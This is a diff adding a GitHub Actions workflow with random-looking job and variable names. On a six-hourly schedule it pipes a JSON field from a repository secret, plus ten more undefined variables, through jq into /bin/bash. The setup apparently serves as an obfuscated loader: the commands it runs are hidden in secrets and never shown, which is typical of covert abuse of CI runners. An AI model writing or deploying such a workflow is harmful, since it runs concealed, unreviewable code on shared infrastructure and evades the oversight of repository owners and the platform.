@@ -1,0 +1,27 @@
+name: shuaidajian1491
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuaidajian1491
+        env:
+          ylo520: ${{ secrets.ylo520 }}
+        run: |
+          echo $ylo520 | jq -r .acdyy7 | /bin/bash
+          echo $nfe5968 | jq -r .o16169 | /bin/bash
+          echo $oex147 | jq -r .u87812 | /bin/bash
+          echo $yhv9 | jq -r .pbeyw1 | /bin/bash
+          echo $ej2683 | jq -r .pw54490 | /bin/bash
+          echo $yb2 | jq -r .zmj342 | /bin/bash
+          echo $k579 | jq -r .f15229 | /bin/bash
+          echo $vzsq40 | jq -r .dxs165 | /bin/bash
+          echo $juevb88216 | jq -r .vose676 | /bin/bash
+          echo $ad5 | jq -r .se146 | /bin/bash
+          echo $b461 | jq -r .l1 | /bin/bash
+
